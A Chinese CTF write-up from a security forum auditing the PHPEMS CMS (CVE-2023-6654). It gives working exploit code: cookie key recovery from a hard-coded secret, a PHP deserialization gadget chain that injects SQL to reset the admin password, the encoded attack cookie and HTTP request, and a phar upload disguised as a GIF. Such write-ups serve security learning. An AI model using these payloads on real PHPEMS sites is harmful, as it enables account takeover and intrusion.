# 代码审计 - PHP - 再谈西湖论剑PHPEMS

> **来源**: https://forum.butian.net/share/2874  
> **文章ID**: 2874

---

前言
==

这是2024西湖论剑的一道1解题，觉得小小PHP真随便审吧，结果又被现实给打爆了，这个CMS整体算是审了快五个小时了，真正的学习完后真的很佩服出了这个题的师傅以及挖出该CVE的师傅，确实真的很强，学到了

‍

题目信息
====

flag2，登录管理员后台，看用户列表就有了。这里是 flag2 提交处，flag格式为 DASCTF2{\*\*\*}, 只提交括号内的字符串。PHPEMS源码下载分流：链接：[https://pan.baidu.com/s/1qK5ox8s4zknefQGsxSWy2g?pwd=DASC提取码：DASC--来自百度网盘超级会员V5的分享](https://pan.baidu.com/s/1qK5ox8s4zknefQGsxSWy2g?pwd=DASC%E6%8F%90%E5%8F%96%E7%A0%81%EF%BC%9ADASC--%E6%9D%A5%E8%87%AA%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E8%B6%85%E7%BA%A7%E4%BC%9A%E5%91%98V5%E7%9A%84%E5%88%86%E4%BA%AB)

hint1: 1. 管理员账号在靶机里已经改过了，教师账号也删了，不要刻舟求剑，自己想其他办法吧，谢谢。

```php
  2. CVE-2023-6654
```

![image](images/attach-b15e155e058f00ee271a7b72e06d4faf1610e87e.png)​

‍

审计
==

路由分析
----

‍

![09a1db789f39fc100181d5f2817fff1](images/attach-6865b21fadd0615ecc1c2fb57576572f41587548.png)​

‍

直接看如何加载类的

![image](images/attach-62054541147dc6ff3b6947ad30e9f0a698196062.png)​

先引入几个模块和配置

`/lib/config.inc.php`​(配置)

`/vendor/vendor/autoload.php`​(项目没有 删掉了)

![image](images/attach-ae15cc7b4c15fea2b3f3b0893bfe7abfb4e0d4d5.png)​

‍

然后调用`run()`​

![image](images/attach-209efec9511b54a58eb93fa5b7b16fee427cfd05.png)​

跟进`make`​方法

![image](images/attach-8e9592171f78c46a322200fb1a078a942d7825d7.png)​

所以`make`​方法就是加载参数.cls.php这个类，并且进行初始化(调用`_init()`​)，传入`ev`​这个类后还默认初始化了`strings`​

![image](images/attach-e63b72c29a313bbab696d9615a6e5b255f232f6b.png)​

往下就是传参进行具体的控制器的映射了

‍

漏洞分析
----

‍

### SQL注入

直接跟index.php的流程可以发现他在没有Cookie的情况下会进行设置sessionid

先看栈堆

```bash
session.cls.php:163, PHPEMS\session->setSessionUser()
session.cls.php:85, PHPEMS\session->getSessionId()
session.cls.php:18, PHPEMS\session->__construct()
init.cls.php:54, PHPEMS\ginkgo::make()
app.php:13, PHPEMS\app->__construct()
init.cls.php:109, PHPEMS\ginkgo->run()
index.php:8, {main}()
```

其实就是默认会有一个加解密Cookie的流程，这个session类是专门处理cookie的，他每次在实例化的时候都会运行到getSessionId

‍

![image](images/attach-162f20db448ce8df323e669eff55c1225b81213b.png)​

‍

![image](images/attach-beb0b110d1bcc0ccecbd47a5704a50cf9c686d6a.png)​

可以发现他是传了`getClientIp()`​方法作为数组的某个键值对作为参数的，看下`getClientIp`​方法

![image](images/attach-ed31be0768642aa71e59ffe10346254b477496c9.png)​

可控

‍

接下来再去看`setSessionUser`​

![image](images/attach-d420071efae70f2b00dabea2303975b2d2f09deb.png)​

其实看下来发现就sessionip可控吧

![image](images/attach-2130ffe97dfe07f76b525d7838bcb023e1a17b9d.png)​

‍

但是这里有一个`$key = CS;`​密钥加解密，可以找到在配置文件中找到硬编码的key

![image](images/attach-4d0dd2a1e26737f51ec4ecf3439793ead69e980e.png)​

然后尝试通过该硬编码尝试对Cookie进行解密

![image](images/attach-dc32afb2c5e0f8d595248c4a00b89f7536862744.png)​

此时我们在来看看encode和decode规律

![image](images/attach-f42048ed2a58925d99f0d5843632897778163033.png)​

```php

<?php

define('CS','1hqfx6ticwRxtfviTp940vng!yC^QK^6');

function encode($info)
    {
        $info = serialize($info);
        $key = CS;
        $kl = strlen($key);
        echo $kl;
        echo "\n";
        $il = strlen($info);
        echo $il;
        for($i = 0; $i < $il; $i++)
        {
            $p = $i%$kl;
            echo $p."fff".$i."\n";
            $info[$i] = chr(ord($info[$i])+ord($key[$p]));
        }
        return urlencode($info);
    }

function decode($info)
    {
        $key = CS;
        $info = urldecode($info);
        $kl = strlen($key);
        $il = strlen($info);
        for($i = 0; $i < $il; $i++)
        {
            $p = $i%$kl;
            $info[$i] = chr(ord($info[$i])-ord($key[$p]));
        }
        $info = unserialize($info);
        return $info;
    }

$info="%92%A2%A4%A0%F3%A9%AE%A2%9D%99%C5%DD%E7%D9%DF%D8%C2%D9%9DVk%E9%A8%9AS%B3e%94%B3%AF%8F%9B%94%99%A8%CB%D9%97%AB%9A%C4%AF%82%AF%D6%9E%D8%CE%87%D2%9Df%92%AD%A2%CBR%DD%A8%80%8C%BE%98ok%8A%E4%CB%EB%A9%DD%D8%D1%E0%C2%9A%AF%D9%B0%A2%8E%92jfg%A4%9E%95Q%A7t%80%8C%BE%98gg%A2%93%D9%DD%A9%E7%D2%D2%E5%C6%E1%E1%CB%E2%D2%C1%D9%ADVk%DF%A8%98X%A9y%96%88%82%94ng%A3%EE";
$inffo = ["sessionid" => "6bd1ec17eaa71a807b8be3bd2b74d1de","sessionip"=> "127.0.0.1","sessiontimelimit"=>"1706877686"];
encode($inffo);
//print_r(encode($inffo));
//var_dump(decode($info));
    ?>
```

关键在与for循环，encode方法就是将明文每32位+key的ascii输出得到密文，decode就是将密文每32位-key的ascii输出 得到明文，就相当于是a+b=c ，key是等于密文-明文

‍

所以就可以逆推出密文，因为我们可以控制的IP，那我们就可以通过密文和明文的比对来吧Key给逆推出来，首先先伪造出127.0.0.1

`X-FORWARDED-FOR: 127.0.0.1`​

明文就为

```php
s:9:"sessionip";s:9:"127.0.0.1";
```

那我们就要选取密文了

得到的密文为

```php
%2592%25A2%25A4%25A0%25F3%25A9%25AE%25A2%259D%2599%25C5%25DD%25E7%25D9%25DF%25D8%25C2%25D9%259DVk%25E9%25A8%259AS%25B3e%25C0%2582%25AD%2591kf%259F%25D4%259B%25A8m%25DA%25A0%25C4%25AA%2586%25DA%25A4%259D%25D8%25A0%25B5%25D4%259Cl%2591%25D7%25D0%25A0V%25B1%25A9%2580%258C%25BE%2598ok%258A%25E4%25CB%25EB%25A9%25DD%25D8%25D1%25E0%25C2%259A%25AF%25D9%25B0%25A2%258E%2592jfg%25A4%259E%2595Q%25A7t%2580%258C%25BE%2598gg%25A2%2593%25D9%25DD%25A9%25E7%25D2%25D2%25E5%25C6%25E1%25E1%25CB%25E2%25D2%25C1%25D9%25ADVk%25DF%25A8%2598X%25A9z%258E%2584%257B%2590ij%25A3%25EE
```

先URL解码一次

```php
%92%A2%A4%A0%F3%A9%AE%A2%9D%99%C5%DD%E7%D9%DF%D8%C2%D9%9DVk%E9%A8%9AS%B3e%C0%82%AD%91kf%9F%D4%9B%A8m%DA%A0%C4%AA%86%DA%A4%9D%D8%A0%B5%D4%9Cl%91%D7%D0%A0V%B1%A9%80%8C%BE%98ok%8A%E4%CB%EB%A9%DD%D8%D1%E0%C2%9A%AF%D9%B0%A2%8E%92jfg%A4%9E%95Q%A7t%80%8C%BE%98gg%A2%93%D9%DD%A9%E7%D2%D2%E5%C6%E1%E1%CB%E2%D2%C1%D9%ADVk%DF%A8%98X%A9z%8E%84%7B%90ij%A3%EE
```

这个就是加密过后的结果，那么我们就要写出逆推脚本，来获取32位可控明文和密文来进行key的推算

```php
// 可控32位明文  :"sessionip";s:9:"127.0.0.1";s:1 

// 密文只能猜测以32位为倍数

function reverse($payload1,$payload2)
{
    $il = strlen($payload1);
    $key= "";
    $kl = 32;
    for($i = 0; $i < $il; $i++)
    {
        $p = $i%$kl;
        $key .= chr(ord($payload1[$i])-ord($payload2[$p]));
    }
    return $key;
}
$info="%92%A2%A4%A0%F3%A9%AE%A2%9D%99%C5%DD%E7%D9%DF%D8%C2%D9%9DVk%E9%A8%9AS%B3e%94%B3%AF%8F%9B%94%99%A8%CB%D9%97%AB%9A%C4%AF%82%AF%D6%9E%D8%CE%87%D2%9Df%92%AD%A2%CBR%DD%A8%80%8C%BE%98ok%8A%E4%CB%EB%A9%DD%D8%D1%E0%C2%9A%AF%D9%B0%A2%8E%92jfg%A4%9E%95Q%A7t%80%8C%BE%98gg%A2%93%D9%DD%A9%E7%D2%D2%E5%C6%E1%E1%CB%E2%D2%C1%D9%ADVk%DF%A8%98X%A9y%96%88%82%94ng%A3%EE";
$info = urldecode($info);
$info = urldecode($info);
$info = substr($info,64,32);
echo reverse($info,':"sessionip";s:9:"127.0.0.1";s:1');
```

![image](images/attach-74557252e9a1d56ac3928374e53f808db98a199a.png)​

‍

但是远程的靶机上的key不对，所以一样办法重新逆一下得到远程的key为 `4b394f264dfcdc724a06b9b05c1e59ed`​

![image](images/attach-6da620e0dc023f140eef5ae3e8606897e832758d.png)​

‍

由于现在主要的目标就是去进入后台，那么我们就要去寻找sql注入的点，并且这个sql注入是包含在了反序列化漏洞中的，于是就找到了`Session::__destruct`​中的执行sql语句的点

![image](images/attach-f1cd4db4cd6add6912f8a73c003105fbba46d7bd.png)​

看上去感觉是预编译了，但是这也就是作者牛逼的地方了吧，首先先跟进`makeUpdate`​方法(真的是恰好就是更新语句)

代码比较多，但是都得看，所以贴出代码

```php
//生成update sql
    public function makeUpdate($args,$tablepre = NULL)
    {
        if(!is_array($args))return false;
        if($tablepre === NULL)$tb_pre = $this->tablepre;
        else $tb_pre = $tablepre;
        $tables = $args[0];
        $args[1] = $this->_makeDefaultUpdateArgs($tables,$args[1]);
        if(is_array($tables))
        {
            $db_tables = array();
            foreach($tables as $p)
            {
                $db_tables[] = "{$tb_pre}{$p} AS $p";
            }
            $db_tables = implode(',',$db_tables);
        }
        else
        $db_tables = $tb_pre.$tables;
        $v = array();

        $pars = $args[1];
        if(!is_array($pars))return false;
        $parsql = array();
        foreach($pars as $key => $value)
        {
            $parsql[] = $key.' = '.':'.$key;
            if(is_array($value))$value = serialize($value);
            $v[$key] = $value;
        }
        $parsql = implode(',',$parsql);

        $query = $args[2];
        if(!is_array($query))$db_query = 1;
        else
        {
            $q = array();
            foreach($query as $p)
            {
                $q[] = $p[0].' '.$p[1].' ';
                if(isset($p[2]))
                $v[$p[2]] = $p[3];
            }
            $db_query = '1 '.implode(' ',$q);
        }
        if(isset($args[3]))
        $db_groups = is_array($args[3])?implode(',',$args[3]):$args[3];
        else
        $db_groups = '';
        if(isset($args[4]))
        $db_orders = is_array($args[4])?implode(',',$args[4]):$args[4];
        else
        $db_orders = '';
        if(isset($args[5]))
        $db_limits = is_array($args[5])?implode(',',$args[5]):$args[5];
        else
        $db_limits = '';
        if($db_limits <span style="font-weight:bold;"> false && $db_limits !</span> false)$db_limits = $this->_mostlimits;
        $db_groups = $db_groups?' GROUP BY '.$db_groups:'';
        $db_orders = $db_orders?' ORDER BY '.$db_orders:'';
        $sql = 'UPDATE '.$db_tables.' SET '.$parsql.' WHERE '.$db_query.$db_groups.$db_orders.' LIMIT '.$db_limits;
        return array('sql' => $sql, 'v' => $v);
    }
```

我们可以发现传入的数组虽然有用但是不可控，但是可以发现`$db_tables`​属性是该类初始化的赋值的，那么通过反序列化就可以进行初始化这个属性从而达到一个sql注入的效果(这种sql我感觉还是非常牛逼的，因为无视了预编译吧，直接赋值拼接的)

所以EXP参考EDI的EXP(让我写真写不出来)

```php
<?php  
namespace PHPEMS{  
    class session{  
    public function __construct()  
    {  
        $this->sessionid="1111111";  
        $this->pdosql= new pdosql();  
        $this->db= new pepdo();  
        }  
    }  
    class pdosql  
    {  
        private $db ;  
        public function __construct()  
        {  
            $this->tablepre = 'x2_user set userpassword="e10adc3949ba59abbe56e057f20f883e" where username="peadmin";#--';  
            $this->db=new pepdo();  
        }  
    }  
    class pepdo  
    {  
        private $linkid = 0;  
    }  
}  

namespace {  
    $info = "%2595%259Cfs%25AF%25D9lon%2586%25D9%25C8%25D7%25D6%25A0%25A1%25A2%25CA%2594X%259D%25AC%259Ccg%259DS%2596i%259B%259B%25C7%2599%2598kp%2595%259Eg%2598%2598%25C7%25CA%259B%259A%2594lid%2593%2592%259B%2594i%25C3fh%2598c%2587p%25AC%259F%259Dn%2584%25A6%259E%25A7%25D9%259B%25A5%25A2%25CD%25D6%2585%259F%25D6qkn%2583ah%2599g%2592%255Ee%2591b%2587p%25AC%259F%2595j%259CU%25AC%2599%25D9%25A5%259F%25A3%25D2%25DA%25CC%25D1%25C8%25A3%259B%25A1%25CA%25A4X%259D%25A2%259Cal%2593g%259Bhk%2595%259Bm%259D%25B0"; // 远程环境
    $info = "%2592%25A2%25A4%25A0%25F3%25A9%25AE%25A2%259D%2599%25C5%25DD%25E7%25D9%25DF%25D8%25C2%25D9%259DVk%25E9%25A8%259AS%25B3e%258F%258A%25AE%25BFii%2599%25D4%259C%25DAl%25A5%259A%2599%25A8%25B8%25AD%25DA%259E%25A7%2599%2584%25D6%259E%2595d%25DB%25A1%25CBU%25ABt%2580%258C%25BE%2598ok%258A%25E4%25CB%25EB%25A9%25DD%25D8%25D1%25E0%25C2%259A%25AF%25D9%25B0%25A2%258E%2592jfg%25A4%259E%2595Q%25A7t%2580%258C%25BE%2598gg%25A2%2593%25D9%25DD%25A9%25E7%25D2%25D2%25E5%25C6%25E1%25E1%25CB%25E2%25D2%25C1%25D9%25ADVk%25DF%25A8%2598X%25A9y%2594%2589%257D%2594ia%25A3%25EE";   //本地环境
    $info = urldecode($info);  
    $info = urldecode($info);  
    $info = substr($info,64,32);  
    function reverse($payload1,$payload2)  
    {  
        $il = strlen($payload1);  
        $key= "";  
        $kl = 32;  
        for($i = 0; $i < $il; $i++)  
        {  
            $p = $i%$kl;  
            $key .= chr(ord($payload1[$i])-ord($payload2[$p]));  
        }  
        return $key;  
    }  

    define(CS1,reverse($info, ':"sessionip";s:9:"127.0.0.1";s:1'));  
    echo CS1;  
    function encode($info)  
    {  
        $info = serialize($info);  
        $key = CS1;  
        $kl = strlen($key);  
        $il = strlen($info);  
        for($i = 0; $i < $il; $i++)  
        {  
            $p = $i%$kl;  
            $info[$i] = chr(ord($info[$i])+ord($key[$p]));  
        }  
        return urlencode($info);  
    }  
    $session = new \PHPEMS\session();  
    $array = array("sessionid"=>"123123123", $session);  
    echo serialize($array)."\n";  
    echo(urlencode(encode($array)))."\n";  
}
```

然后得到Cookie

```php
%2595%259Ces%25AF%25D9lon%2586%25D9%25C8%25D7%25D6%25A0%25A1%25A2%25CA%2594X%259D%25AC%259Cio%2585b%2597hj%2597%2597e%2594f%255Bo%25CFlfo%25B3%25A0%2594%2598%259DY%2582%257C%25B1u%2583%25B5%2595%25D5%2595%25A8%25D6%259A%25D4%25A3%255B%259F%2597n%25DD%25A6sm%25A0T%25A9%2599%25D7%25D9%25CC%25D3%25D1%25A0%2596V%259C%25A3p%2599s%2584af%2594b%2596fj%2587%259F%25A7%259CisV%25D6%2596%25A5%25A7%25D5%25D2%2585%259F%25B2qcg%259BR%2586%25AA%2589%25A7%257D%2588%25BF%25A1%25C9%25A4%25AC%25D6%25D0V%259Ces%25AF%25D9lgk%259E%2588c%25B4%25AB%2587w%2581%25B4%258C%25A6%25C6%25A8%25D5%25A1%25A1c%2595%25C7Wt%25B4%259Ee%2594m%255B%2584%25AE%2582%257B%2581%25B7%25C2%25D3%25C9%25D3%259B%25A1V%259Bap%25DD%25AC%259Cbe%259DSe%2585%2581%25B5%25A9%2581%25B5%258F%25A9%2599%25D6%2596%25A54%25D0%25CF%25D1%25CF%25CC%259BTo%25CAjf%259D%25B6%25D5jm%259DS%25D9%2596%259B%25D1%25C9%25A4%25D4%2598%255Bo%25D9lnl%259E%2588%25DB%2596%25C2%25AC%25A5%2599%25D3P%25A9%25C7%25AD%2582%25A5%25A8%25C8%25A3%25D5%2596%25AC%25D8%25DB%25A3%25D4%2597vV%25CBcf%2595%25C8%25C9%2596%259D%2597p%2594%2595%2596i%2597%25C4%259B%25C7ek%25C8a%259Al%259F%2597%2594%259A%259Akl%2599%2588R%25AD%259C%25C9%25D8%25C8%2584%25D8%25AA%2597%25A6%25CF%2591%25A3%25C7v%2584%25A0%259A%25C4%2595%25D2%259E%25A7%2587%259FW%258F%2560%255Bo%25E3%25A5pf%259E%2588%25C7%25C6%2585r%2581n%2592bp%2584%2589%25AA%2580z%25B0%2584%25C1%25A5%259E%25D5%25C8%25A3%2584mjn%25E1%25A5pf%2594%25A0%2585d%25B3%257F%2582y%25AE%2583%2592%25D2%259E%25D2%2594%25A4c%259D%25CE%25A3%25A4%25CE%25C8V%259D%259Csd%25A1%25AF%25B3%25B1
```

由于是以这种形式传的Cookie

![image](images/attach-8f98a6be8d65f790031eefa7e25f438098e8c284.png)​

所以报文为

```xml
GET /index.php HTTP/1.1
Host: exam.cyan.wetolink.com
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
X-FORWARDED-FOR: 127.0.0.1
Cookie: exam_currentuser=%2595%259Ces%25AF%25D9lon%2586%25D9%25C8%25D7%25D6%25A0%25A1%25A2%25CA%2594X%259D%25AC%259Cio%2585b%2597hj%2597%2597e%2594f%255Bo%25CFlfo%25B3%25A0%2594%2598%259DY%2582%257C%25B1u%2583%25B5%2595%25D5%2595%25A8%25D6%259A%25D4%25A3%255B%259F%2597n%25DD%25A6sm%25A0T%25A9%2599%25D7%25D9%25CC%25D3%25D1%25A0%2596V%259C%25A3p%2599s%2584af%2594b%2596fj%2587%259F%25A7%259CisV%25D6%2596%25A5%25A7%25D5%25D2%2585%259F%25B2qcg%259BR%2586%25AA%2589%25A7%257D%2588%25BF%25A1%25C9%25A4%25AC%25D6%25D0V%259Ces%25AF%25D9lgk%259E%2588c%25B4%25AB%2587w%2581%25B4%258C%25A6%25C6%25A8%25D5%25A1%25A1c%2595%25C7Wt%25B4%259Ee%2594m%255B%2584%25AE%2582%257B%2581%25B7%25C2%25D3%25C9%25D3%259B%25A1V%259Bap%25DD%25AC%259Cbe%259DSe%2585%2581%25B5%25A9%2581%25B5%258F%25A9%2599%25D6%2596%25A54%25D0%25CF%25D1%25CF%25CC%259BTo%25CAjf%259D%25B6%25D5jm%259DS%25D9%2596%259B%25D1%25C9%25A4%25D4%2598%255Bo%25D9lnl%259E%2588%25DB%2596%25C2%25AC%25A5%2599%25D3P%25A9%25C7%25AD%2582%25A5%25A8%25C8%25A3%25D5%2596%25AC%25D8%25DB%25A3%25D4%2597vV%25CBcf%2595%25C8%25C9%2596%259D%2597p%2594%2595%2596i%2597%25C4%259B%25C7ek%25C8a%259Al%259F%2597%2594%259A%259Akl%2599%2588R%25AD%259C%25C9%25D8%25C8%2584%25D8%25AA%2597%25A6%25CF%2591%25A3%25C7v%2584%25A0%259A%25C4%2595%25D2%259E%25A7%2587%259FW%258F%2560%255Bo%25E3%25A5pf%259E%2588%25C7%25C6%2585r%2581n%2592bp%2584%2589%25AA%2580z%25B0%2584%25C1%25A5%259E%25D5%25C8%25A3%2584mjn%25E1%25A5pf%2594%25A0%2585d%25B3%257F%2582y%25AE%2583%2592%25D2%259E%25D2%2594%25A4c%259D%25CE%25A3%25A4%25CE%25C8V%259D%259Csd%25A1%25AF%25B3%25B1
Referer: http://phpems.xyz/index.php
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
```

‍

‍

### Phar(非预期)

```xml
app/weixin/controller/index.api.php中的file_getcontents
```

![image](images/attach-e115e35d1838e610a7b8bf35474310365fa79c60.png)​

‍

直接去访问下这股路由发现返回了以下信息

```xml

        ]]>
    </ToUserName>
    <FromUserName>
        <![CDATA[

        text

        信息已接收

        1707039415

        0

```

![image](images/attach-925c4d267c2fa4c2736bf5aafb64ba6e05cef93c.png)​

‍

其实可以说明是接受XML数据的了，不过还是去看看代码

![image](images/attach-89ba5a853c82307ca39978d2083d614bb08fa5b7.png)​

跟踪`getRev()`​

![image](images/attach-6ca70c8195d37a454a571e61afbf1e745d7c2389.png)​

直接接收XML数据并且进行数组处理

获取`Type`​ 其实都是XML格式的子集，所以很轻松的拿到需要传参的数据，构造请求报文为如下

![image](images/attach-da9c944b67b33608669bb2f28e4b4b4165b77e40.png)​

```xml

        zjacky

        zjacky

        image

        zjacky

        phar:///etc/passwd

        1707039415

        xxx

```

‍

紧接着就是找上传点了，上传点位于

```php
app/document/controller/fineuploader.api.php
```

![image](images/attach-2ccd15c98064151739ff490ebdc0fdee5f6c1db9.png)​

直接进行上传，构造上传报文

![image](images/attach-fc556c4f2870ae4122d9ed1f6d0b0413068e2186.png)​

发现有返回地址，非常方便

```xml
{"success":true,"thumb":"files\/attach\/images\/content\/20240204\/17070404291915.jpg","title":"1.jpg"}
```

然后生成下phar上传即可触发反序列化了

```php
<?php  
namespace PHPEMS{  
    class session{  
        public function __construct()  
        {  
            $this->sessionid="1111111";  
            $this->pdosql= new pdosql();  
            $this->db= new pepdo();  
        }  
    }  
    class pdosql  
{  
        private $db ;  
        public function __construct()  
{  
            $this->tablepre = 'x2_user set userpassword="e10adc3949ba59abbe56e057f20f883e" where username="peadmin";#--';  
            $this->db=new pepdo();  
        }  
    }  
    class pepdo  
{  
        private $linkid = 0;  
    }  
}  
namespace {  
    $o = new \PHPEMS\session();  
    $filename = '111.phar';// 后缀必须为phar，否则程序无法运行  
    file_exists($filename) ? unlink($filename) : null;  
    $phar=new Phar($filename);  
    $phar->startBuffering();  
    $phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");  
    $phar->setMetadata($o);  
    $phar->addFromString("foo.txt","bar");  
    $phar->stopBuffering();  
    system('copy 111.phar 111.gif');  
}  

?>
```

‍

然后进到后台管理拿到第二个flag

![image](images/attach-bbee0df671e48c139d6b899c0eb51456065fc35b.png)​

其实有个RCE，不过参考下文章吧，我就没去看那个了

‍

‍

总结
==

整体上这个CMS还是非常值得去复现学习的，因为他的框架稍乱，引用也难受，但也是一种挑战了，真强啊这些师傅

‍

参考链接
====

<https://mp.weixin.qq.com/s/P7akQHPp4saCl16E0Kw4tA>
